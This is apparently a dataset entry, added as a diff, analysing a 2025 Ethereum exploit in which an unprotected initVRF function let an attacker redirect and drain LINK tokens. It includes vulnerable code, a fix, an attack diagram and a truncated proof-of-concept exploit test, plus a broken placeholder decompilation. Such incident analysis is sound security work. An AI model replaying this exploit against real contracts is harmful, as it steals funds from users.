@@ -1,0 +1,30 @@
+{
+ "id": "2025__2025-08-20_0xf340_MissingAccessControl-VRF",
+ "source_file": "2025/2025-08-20_0xf340_MissingAccessControl-VRF.md",
+ "title": "0xf340 — initVRF Missing Access Control Analysis",
+ "date": "2025-08-20",
+ "protocol": "0xf340",
+ "chain": "Ethereum",
+ "loss_raw": "~4,000 USD",
+ "loss_usd": null,
+ "root_cause": "No access control on `initVRF` function, allowing attacker to set an arbitrary address in storage and drain LINK tokens",
+ "attack_tx": "0x103b4550...",
+ "vulnerable_contract": "0xf340bd3eb3e82994cff5b8c3493245edbce63436",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: no access control on initVRF\nfunction initVRF(address recipient, address token) external {\n    // No onlyOwner or initializer!\n    // Anyone can write recipient and token to storage\n    vrfRecipient = recipient;\n    vrfToken = token;\n}\n\n// 0x607d60e6 function: transfers LINK to vrfRecipient\nfunction distributeLINK(uint256 slot) external {\n    // Sends LINK to the recipient set via initVRF\n    IERC20(vrfToken).transfer(vrfRecipient, linkPerSlot);\n}\n\n//",
+  "// File: 0xf340_decompiled.sol\ncontract 0xf340 {\ncontract 0xf340 {\n\n    // Selector: 0x5c60da1b\n    function implementation() external {  // ❌ Vulnerability\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x3659cfe6\n    function upgradeTo(address a) external {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x8f283970\n    function changeAdmin(address a) external view returns (uint256) {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0xf851a440\n    function admin() external view returns (uint256) {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x4f1ef286\n    function upgradeToAndCall(address a, bytes calldata b) external {\n        // TODO: decompile logic not implemented\n    }\n\n}"
+ ],
+ "code_after": [
+  "✅ Fix: add onlyOwner\nfunction initVRF(address recipient, address token) external onlyOwner {\n    vrfRecipient = recipient;\n    vrfToken = token;\n}"
+ ],
+ "steps": [
+  "no access control → vrfRecipient = attacker address"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─▶ calls victim.initVRF(attacker, LINK)\n  │         └─ no access control → vrfRecipient = attacker address\n  │\n  ├─[2]─▶ for (i = 0; i < 80; i++)\n  │           calls victim.call(0x607d60e6, 0)\n  │           └─ each call transfers LINK to the attacker\n  │\n  ├─[3]─▶ after 80 iterations, all LINK fully drained\n  │\n  ├─[4]─▶ swaps LINK for ETH via UniswapV2\n  │\n  └─[5]─▶ nets ~4,000 USD worth of ETH",
+  "function testExploit() public balanceLog {\n    // [1] Call initVRF: recipient = attacker, token = LINK\n    // No access control → succeeds immediately\n    victim.initVRF(address(this), address(link));\n\n    // [2] Call 0x607d60e6 function 80 times\n    // Each call transfers LINK to the attacker (this)\n    uint256 slot = 0 ether;\n    for (uint256 i = 0; i < 80; i++) {\n        (bool success, ) = address(victim).call(\n            abi.encodeWithSelector(bytes4(0x607d60e6), slot)\n        );\n        require(success, \"call failed\");\n    }\n\n    // [3] Swap received LINK for ETH\n    uint256 attackerLinkBal = link.balanceOf(address(this));\n    link.approve(address(router), attackerLinkBal);\n\n    address[] memory path = new address[](2);\n    path[0] = address(link);\n    path[1] = address(weth);\n    //"
+ ]
+}
